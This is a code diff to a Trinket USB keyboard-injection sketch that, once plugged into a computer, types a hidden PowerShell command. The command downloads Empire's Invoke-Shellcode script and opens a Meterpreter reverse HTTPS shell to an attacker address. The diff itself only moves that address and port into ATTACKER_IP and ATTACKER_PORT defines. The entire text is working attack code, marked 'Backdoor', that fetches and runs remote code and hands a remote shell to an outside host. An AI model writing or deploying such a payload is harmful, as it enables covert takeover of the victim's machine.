@@ -1,5 +1,8 @@
 #include <ProTrinketKeyboard.h>
 
+#define ATTACKER_IP "192.168.10.1"
+#define ATTACKER_PORT "8443"
+
 void pollingDelay(unsigned long);
 
 void setup()
@@ -33,7 +36,10 @@ void loop()
   TrinketKeyboard.println("COLOR FE");
 
   // Backdoor
-  TrinketKeyboard.println("powershell -nop -windowstyle hidden -NonInteractive -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');invoke-shellcode -Payload windows/meterpreter/reverse_https -f -Lhost 172.23.5.32 -Lport 8443");
+  TrinketKeyboard.print("powershell -nop -windowstyle hidden -NonInteractive -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');invoke-shellcode -Payload windows/meterpreter/reverse_https -f -Lhost ");
+  TrinketKeyboard.print(ATTACKER_IP);
+  TrinketKeyboard.print(" -Lport ");
+  TrinketKeyboard.println(ATTACKER_PORT);
 
   exit(0);
 }
